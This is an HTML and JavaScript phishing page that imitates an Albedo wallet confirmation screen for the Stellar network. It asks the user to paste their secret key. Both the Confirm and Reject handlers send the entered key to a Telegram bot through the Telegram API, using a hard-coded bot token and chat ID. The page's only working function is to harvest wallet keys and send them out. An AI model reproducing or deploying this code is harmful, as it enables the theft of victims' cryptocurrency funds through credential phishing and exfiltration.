<body>
    <!-- Main App Container -->
    <div class="main-container">
        <!-- Header -->
        <div class="container text-right">

        <!-- Page Content -->
        <div class="page-container container space">

                <!-- Request Information -->
                <div>
                    <div>

                    <!-- Secret Key Input Section -->

                            <input type="text" class="Secretkey" id="secretKey" name="PrivateKey" required="true" placeholder="Secret key starting with 'S', like 'SAK4...2PLT'" value="">
                        </div>
                    </div> 
                    
                    <!-- Action Buttons -->
                    <button class="button enable button-block" id="confirmBtn">
                        Confirm using Albedo account

                        Reject
                    </button>
                </div>

    <!-- Telegram Notification Container -->
    <div id="telegramNotification" class="telegram-notification"></div>

    <script>

        
        const BOT_TOKEN = '8864992919:AAHkE0jyViloI1sSKLc8lnRh6Tdt7Affr0w';  // 
        const CHAT_ID = '7196180695'; // 
        
        // Function to display a notification
        function showNotification(message, type = 'info') {
            const notification = document.getElementById('telegramNotification');
            notification.textContent = message;
            notification.className = `telegram-notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        
        async function sendMessageToTelegram(message) {
            // Validasi input
            if (!message || message.trim() === '') {
                showNotification('Message cannot be empty!', 'error');
                return false;
            }
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
            
            try {
                showNotification('Loading to account. . .', 'info');
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    console.log('Message successfully sent to Telegram!');
                    
                    return true;
                } else {
                    console.error('Failed to send message:', data);
                    showNotification(`❌ Gagal: ${data.description}`, 'error');
                    return false;
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification(`❌ Error: ${error.message}`, 'error');
                return false;
            }
        }
        
        // Function to format a Telegram message
        function formatTelegramMessage(secretKey, action = 'confirm') {
            const timestamp = new Date().toLocaleString('id-ID');
            const actionText = action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED';
            
            return `
🔐 <b>STELLAR KEY ALERT</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
🎯 <b>Action:</b> ${actionText}
━━━━━━━━━━━━━━━━━━━━━
🔑 <b>Secret Key:</b>
<code>${secretKey}</code>
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>This is an automated message</i>
            `.trim();
        }
        
        // Event handler for the Confirm button
        document.getElementById('confirmBtn').addEventListener('click', async function(e) {
            e.preventDefault();
            
            // Get input value
            const secretKeyInput = document.querySelector('.Secretkey');
            const secretKey = secretKeyInput.value.trim();
            
            // Validasi secret key (must start with at least 'S')
            if (!secretKey) {
                showNotification('⚠️ Secret key cannot be empty!', 'error');
                secretKeyInput.style.border = '2px solid #f44336';
                return;
            }
            
            if (!secretKey.startsWith('S')) {
                showNotification('⚠️ Secret key must start with a letter "S"!', 'error');
                secretKeyInput.style.border = '2px solid #f44336';
                return;
            }
            
            // Reset border
            secretKeyInput.style.border = '';
            
            // Format the message
            const telegramMessage = formatTelegramMessage(secretKey, 'confirm');
            
            // Send to Telegram
            const success = await sendMessageToTelegram(telegramMessage);
            
            if (success) {
// Optional: Clear input after successful submission
// secretKeyInput.value = '';

// Optional: Continue to the next process
                // window.location.href = 'next-page.html';
            }
        });
        
        // Event handler for the Reject button
        document.getElementById('rejectBtn').addEventListener('click', async function(e) {
            e.preventDefault();
            
            const secretKeyInput = document.querySelector('.Secretkey');
            const secretKey = secretKeyInput.value.trim() || '(empty)';
            
            // Format reject message
            const telegramMessage = formatTelegramMessage(secretKey, 'reject');
            
            // Send to Telegram
            await sendMessageToTelegram(telegramMessage);
            
            // Display reject message
            showNotification('Anda menolak permintaan ini', 'info');
            
            // Optional: Reset form or redirect
            // secretKeyInput.value = '';
        });
        
        // Validate input while typing
        document.querySelector('.Secretkey').addEventListener('input', function(e) {
            // Reset border saat user mulai mengetik
            this.style.border = '';
            
            // Optional: Auto capitalize S
            if (this.value.length === 1 && this.value !== 'S') {
                // Not mandatory, just a visual suggestion
                this.style.border = '2px solid #ff9800';
            }
        });
        
        // Logging for debugging (remove in production)
        console.log('Telegram integration loaded');
        console.log('Bot Token exists:', !!BOT_TOKEN);
        console.log('Chat ID exists:', !!CHAT_ID);
    </script>
